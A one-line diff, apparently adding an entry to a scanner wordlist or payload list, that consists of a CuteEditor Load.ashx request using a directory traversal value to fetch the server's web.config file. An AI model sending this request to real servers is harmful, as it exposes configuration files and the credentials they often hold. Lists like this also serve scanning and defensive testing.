@@ -1,0 +1,1 @@
+CuteEditor/Load.ashx?type=image&file=../../../web.config
